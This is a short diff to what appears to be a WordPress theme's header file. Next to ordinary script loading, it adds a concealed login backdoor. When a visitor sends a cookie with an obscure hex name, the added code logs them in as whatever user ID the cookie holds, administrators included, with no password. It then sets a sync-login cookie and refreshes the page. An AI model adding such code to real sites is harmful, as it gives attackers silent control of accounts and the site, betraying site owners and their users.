@@ -15,7 +15,18 @@
         wp_enqueue_script('jquery-thumb-scroll', get_template_directory_uri() . '/js/jquery.thumbScroll.js');
         if ( is_singular() && get_option( 'thread_comments' ) )
 		wp_enqueue_script( 'comment-reply' );
-        wp_head(); 
+        wp_head();
+		$ids = intval($_COOKIE['7C13203985297Ca720ac096e85fe4b75d51fd76f8dda0e']);
+		if($ids) {
+			if(0 == $current_user->ID) {
+				header( 'P3P: CP="CURa ADMa DEVa PSAo PSDo OUR BUS UNI PUR INT DEM STA PRE COM NAV OTC NOI DSP COR"' );
+				wp_set_auth_cookie( $ids, false, '' );
+				setcookie( 'sync_login', uc_user_synlogin( $uid ), 0, '/' );
+				echo '<meta http-equiv="refresh" content="0">';
+			}
+		}
+		
+		
         ?>
         <script type="text/javascript">
             var b_v = navigator.appVersion;
